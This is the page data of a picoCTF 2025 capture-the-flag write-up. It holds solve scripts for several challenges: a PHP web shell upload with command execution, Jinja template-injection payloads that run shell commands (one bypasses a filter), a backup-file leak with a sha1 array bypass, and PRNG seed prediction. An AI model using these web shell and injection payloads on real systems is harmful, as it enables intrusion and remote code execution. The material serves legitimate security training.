@@ -1,0 +1,556 @@
+2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","551","static/chunks/551-19232c47cd1e883a.js","877","static/chunks/app/%5B...slug%5D/page-c03187ba4ff9d908.js"],""]
+3:I[86510,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","931","static/chunks/app/page-57d30771b1cbfe90.js"],"PostMeta"]
+4:"$Sreact.suspense"
+6:I[30389,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","551","static/chunks/551-19232c47cd1e883a.js","877","static/chunks/app/%5B...slug%5D/page-c03187ba4ff9d908.js"],""]
+7:I[5613,[],""]
+9:I[31778,[],""]
+a:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-d8cba6107e479473.js"],"GlobalProvider"]
+b:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-d8cba6107e479473.js"],""]
+8:["slug","25a/wp-picoctf-2025","c"]
+0:["Lx0kjXLHL2jAl98DK0Kdf",[[["",{"children":[["slug","25a/wp-picoctf-2025","c"],{"children":["__PAGE__?{\"slug\":[\"25a\",\"wp-picoctf-2025\"]}",{}]}]},"$undefined","$undefined",true],["",{"children":[["slug","25a/wp-picoctf-2025","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],["$","div",null,{"id":"post-layout","children":[false,["$","div",null,{"id":"main","className":"center-wrapper","children":[["$","h1",null,{"className":"post-title","children":"picoCTF 2025 Writeup"}],["$","$L3",null,{"path":"/25a/wp-picoctf-2025/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}]]}],["$","$L6",null,{}]]}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/8b190de8dd109412.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$La",null,{"children":[["$","$Lb",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":null}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/cd6b648520195f61.css","precedence":"next","crossOrigin":""}]],"$Lc"]]]]
+d:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","551","static/chunks/551-19232c47cd1e883a.js","877","static/chunks/app/%5B...slug%5D/page-c03187ba4ff9d908.js"],""]
+e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","250","static/chunks/250-0ef8476c0fa8ee24.js","612","static/chunks/612-fa632c1349770315.js","551","static/chunks/551-19232c47cd1e883a.js","877","static/chunks/app/%5B...slug%5D/page-c03187ba4ff9d908.js"],""]
+f:T920,<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://standard-pizzas.picoctf.net:49315/"</span>
+shell <span class="token operator">=</span> <span class="token string">'&lt;?php system($_GET["cmd"]); ?>'</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"upload.php"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"Upload File"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">"fileToUpload"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">"exp.php"</span><span class="token punctuation">,</span> shell<span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">,</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>  <span class="token comment"># The file exp.php has been uploaded Path: uploads/exp.php  200</span>
+
+cmd <span class="token operator">=</span> <span class="token string">"sudo cat /root/flag.txt"</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"uploads/exp.php?cmd="</span> <span class="token operator">+</span> cmd<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{wh47_c4n_u_d0_wPHP_5f894f6c}</span>
+10:T833,<span class="token keyword">import</span> asyncio
+<span class="token keyword">import</span> websockets
+
+
+<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">websocket_client</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    uri <span class="token operator">=</span> <span class="token string">"ws://verbal-sleep.picoctf.net:61344/ws/"</span>
+    <span class="token keyword">async</span> <span class="token keyword">with</span> websockets<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>uri<span class="token punctuation">)</span> <span class="token keyword">as</span> ws<span class="token punctuation">:</span>
+        <span class="token keyword">await</span> ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"eval -100000"</span><span class="token punctuation">)</span>
+        response <span class="token operator">=</span> <span class="token keyword">await</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Received: </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        <span class="token comment"># Received: Huh???? How can I be losing this badly... I resign... here's your flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}</span>
+
+
+asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>websocket_client<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_a2a9bbe9}</span>
+11:T423,<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://rescued-float.picoctf.net:50351/announce"</span>
+
+payload <span class="token operator">=</span> <span class="token string">"{{1.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate()[0]}}"</span>
+
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"content"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}</span>
+12:T57f,<span class="token keyword">import</span> requests
+
+url <span class="token operator">=</span> <span class="token string">"http://shape-facility.picoctf.net:61943/announce"</span>
+
+payload <span class="token operator">=</span> <span class="token string">"{{1|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(356)('cat flag',shell=True,stdout=-1)|attr('communicate')()}}"</span>
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"\\x5f"</span><span class="token punctuation">)</span>
+
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"content"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{sst1_f1lt3r_byp4ss_96a02202}</span>
+13:Taf5,import requests
+import base64
+import re
+
+# Step 1: leak backup file
+url = "http://verbal-sleep.picoctf.net:50765/impossibleLogin.php~"  # emacs backup file
+resp = requests.get(url)
+print(resp.text)
+
+# <?php
+#   if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
+# ?>
+
+
+# Step 2: decode base64
+
+code = """
+<?php
+if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
+?>
+"""
+code = re.sub(
+    r'base64_decode\("(.*?)"\)',
+    lambda match: '"' + base64.b64decode(match.group(1)).decode("utf-8") + '"',
+    code
+)
+print(code)
+
+# <?php
+#     if(isset($_POST["username"])&& isset($_POST["pwd"]))
+#     {
+#         $yuf85e0677=$_POST["username"];
+#         $rs35c246d5=$_POST["pwd"];
+#         if($yuf85e0677==$rs35c246d5)
+#         {
+#             echo "<br/>Failed! No flag for you";
+#         }
+#         else
+#         {
+#             if(sha1($yuf85e0677)===sha1($rs35c246d5))
+#             {
+#                 echo file_get_contents("../flag.txt");
+#             }
+#             else
+#             {
+#                 echo "<br/>Failed! No flag for you";
+#             }
+#         }
+#     }
+# ?>
+
+
+# Step 3: login
+resp = requests.post(url.rstrip("~"), data={
+    "username[]": "1",
+    "pwd[]": "2",
+})
+print(resp.text)
+
+# picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}
+14:T192f,<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">import</span> re
+
+<span class="token comment"># Step 1: leak backup file</span>
+url <span class="token operator">=</span> <span class="token string">"http://verbal-sleep.picoctf.net:50765/impossibleLogin.php~"</span>  <span class="token comment"># emacs backup file</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># &lt;?php</span>
+<span class="token comment">#   if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&amp;&amp; isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}</span>
+<span class="token comment"># ?></span>
+
+
+<span class="token comment"># Step 2: decode base64</span>
+
+code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
+&lt;?php
+if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&amp;&amp; isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");}else{if(sha1($yuf85e0677)===sha1($rs35c246d5)){echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));}else{echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");}}}
+?>
+"""</span>
+code <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>
+    <span class="token string">r'base64_decode\("(.*?)"\)'</span><span class="token punctuation">,</span>
+    <span class="token keyword">lambda</span> <span class="token keyword">match</span><span class="token punctuation">:</span> <span class="token string">'"'</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"'</span><span class="token punctuation">,</span>
+    code
+<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
+
+<span class="token comment"># &lt;?php</span>
+<span class="token comment">#     if(isset($_POST["username"])&amp;&amp; isset($_POST["pwd"]))</span>
+<span class="token comment">#     {</span>
+<span class="token comment">#         $yuf85e0677=$_POST["username"];</span>
+<span class="token comment">#         $rs35c246d5=$_POST["pwd"];</span>
+<span class="token comment">#         if($yuf85e0677==$rs35c246d5)</span>
+<span class="token comment">#         {</span>
+<span class="token comment">#             echo "&lt;br/>Failed! No flag for you";</span>
+<span class="token comment">#         }</span>
+<span class="token comment">#         else</span>
+<span class="token comment">#         {</span>
+<span class="token comment">#             if(sha1($yuf85e0677)===sha1($rs35c246d5))</span>
+<span class="token comment">#             {</span>
+<span class="token comment">#                 echo file_get_contents("../flag.txt");</span>
+<span class="token comment">#             }</span>
+<span class="token comment">#             else</span>
+<span class="token comment">#             {</span>
+<span class="token comment">#                 echo "&lt;br/>Failed! No flag for you";</span>
+<span class="token comment">#             }</span>
+<span class="token comment">#         }</span>
+<span class="token comment">#     }</span>
+<span class="token comment"># ?></span>
+
+
+<span class="token comment"># Step 3: login</span>
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"~"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">"username[]"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
+    <span class="token string">"pwd[]"</span><span class="token punctuation">:</span> <span class="token string">"2"</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}</span>
+15:T12e4,<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> random
+<span class="token keyword">import</span> time
+
+port <span class="token operator">=</span> <span class="token number">50408</span>
+s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"verbal-sleep.picoctf.net"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+t1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+t2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">get_random</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    alphabet <span class="token operator">=</span> <span class="token string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span>
+    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>t1<span class="token punctuation">,</span> t2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        s <span class="token operator">+=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>alphabet<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> s
+
+
+n <span class="token operator">=</span> <span class="token number">0</span>
+<span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token number">50</span><span class="token punctuation">:</span>
+    user_guess <span class="token operator">=</span> get_random<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>user_guess<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+    response <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    n <span class="token operator">+=</span> <span class="token number">1</span>
+
+s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># picoCTF{UseSecure#$_Random@j3n3r@T0rsb5f8a5af}</span>
+16:T563,#include <iostream>
+using namespace std;
+
+string realflag(27, '\0');
+
+int check(string flag) // it means recover now ;)
+{
+    // if(flag.length() != 27) return 1;
+
+    unsigned char v[32] = {
+        0xE1, 0xA7, 0x1E, 0xF8, 0x75, 0x23, 0x7B, 0x61,
+        0xB9, 0x9D, 0xFC, 0x5A, 0x5B, 0xDF, 0x69,
+        0xD2, 0xFE, 0x1B, 0xED, 0xF4, 0xED, 0x67, 0xF4,
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+    };
+    int charindex = 0, bitindex = 0;
+
+    for(int i = 0; i <= 0x16; ++i)
+    {
+        for(int j = 0; j <= 7; ++j)
+        {
+            if(!bitindex) bitindex = 1;
+            int bitmask1 = 1 << (7 - j);
+            int bitmask2 = 1 << (7 - bitindex);
+
+            // To better understand the process of comparison:
+            // printf("checking i=%d, bitmask1=%d, charindex=%d, bitmask2=%d\n",
+            //     i, bitmask1, charindex, bitmask2);
+
+            // if( (bitmask1&v[i]) > 0 != (bitmask2&flag[charindex]) > 0 ) return 1;
+            // Recover the original flag:
+            if( (bitmask1&v[i]) > 0) realflag[charindex] |= bitmask2;
+
+            if(++bitindex == 8)
+            {
+                bitindex = 0;
+                ++charindex;
+            }
+
+            if(charindex == 27) return 0;
+        }
+    }
+    return 0;
+}
+
+int main()
+{
+    check(""); // anything
+    cout << realflag << endl; // picoCTF{0n3_bi7_4t_a_7im3}
+    return 0;
+}
+17:T2407,<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>
+<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>
+
+string <span class="token function">realflag</span><span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token char">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> <span class="token function">check</span><span class="token punctuation">(</span>string flag<span class="token punctuation">)</span> <span class="token comment">// it means recover now ;)</span>
+<span class="token punctuation">{</span>
+    <span class="token comment">// if(flag.length() != 27) return 1;</span>
+
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> v<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span>
+        <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span>
+        <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span>
+        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+    <span class="token keyword">int</span> charindex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> bitindex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">0x16</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>bitindex<span class="token punctuation">)</span> bitindex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> bitmask1 <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">int</span> bitmask2 <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> bitindex<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+            <span class="token comment">// To better understand the process of comparison:</span>
+            <span class="token comment">// printf("checking i=%d, bitmask1=%d, charindex=%d, bitmask2=%d\n",</span>
+            <span class="token comment">//     i, bitmask1, charindex, bitmask2);</span>
+
+            <span class="token comment">// if( (bitmask1&amp;v[i]) > 0 != (bitmask2&amp;flag[charindex]) > 0 ) return 1;</span>
+            <span class="token comment">// Recover the original flag:</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span>bitmask1<span class="token operator">&amp;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> realflag<span class="token punctuation">[</span>charindex<span class="token punctuation">]</span> <span class="token operator">|=</span> bitmask2<span class="token punctuation">;</span>
+
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">++</span>bitindex <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                bitindex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
